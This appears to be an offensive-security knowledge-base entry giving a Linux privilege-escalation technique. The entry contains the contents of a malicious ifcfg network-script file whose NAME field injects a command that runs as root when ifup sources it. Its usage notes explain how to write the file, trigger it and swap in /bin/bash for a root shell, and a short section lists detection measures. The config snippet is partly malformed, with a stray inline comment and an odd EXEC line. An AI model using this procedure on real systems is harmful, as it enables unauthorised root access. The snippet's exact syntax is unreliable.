---
id: f7d3864c-d458-4127-b780-fde7fd9b765c
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:19.190010+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - privilege-escalation
  - config-injection
  - linux
validated: true
---

# Ifcfg-Network-Script-Privilege-Escalation-Config

## Code

```bash
NAME=Network /bin/id <= Note the blank space
ONBOOT=yes
DEVICE=eth0

EXEC :
./etc/sysconfig/network-scripts/ifcfg-1337
```

## Description

This code snippet is the content for a malicious ifcfg-* network configuration file. When written to /etc/sysconfig/network-scripts/ifcfg-1337 and sourced by ifup (which runs as root), the space in the NAME field allows command injection (/bin/id executes as root), and the EXEC field attempts to execute or chain to the file itself, potentially enabling further payload delivery or persistence.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | This is static config content; customize the injected command (e.g., replace /bin/id with desired payload like /bin/bash) | N/A |

## Usage

Use this in a privilege escalation procedure on writable /etc/sysconfig/network-scripts/. Write it via cat > ifcfg-1337 << EOF, then trigger with ifup ifcfg-1337. Ideal for CentOS/RedHat post-exploitation to gain root shell without reboot.

## Detection

- Monitor file creations/modifications in /etc/sysconfig/network-scripts/ via auditd or inotify.
- Log ifup executions and scan sourced files for anomalous variable assignments (e.g., spaces in NAME).
- Integrity checks on network config files; alert on non-standard fields like EXEC.

## Related

- [[procedures/Linux-Writable-Etc-Sysconfig-Network-Scripts-Privilege-Escalation]]
